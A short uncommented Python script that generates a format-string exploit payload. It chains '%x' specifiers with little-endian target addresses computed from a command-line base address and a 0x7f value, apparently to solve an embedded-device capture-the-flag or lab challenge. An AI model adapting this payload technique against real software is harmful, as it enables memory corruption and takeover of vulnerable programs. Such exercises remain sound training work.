import sys 

def main(addr):
    a = 0x4900 - 0x476a
    b = 0x4988 - 0x476a

    payload = '2578257825782578'

    addr1 = hex(int(addr, 16) + a)[2:]
    addr2 = hex(int(addr, 16) + b)[2:]
    print(addr1, addr2)

    payload += addr1[2:] + addr1[:2] 
    payload += '007f'
    payload += addr2[2:] + addr2[:2]

    return payload

print(main(sys.argv[1]))

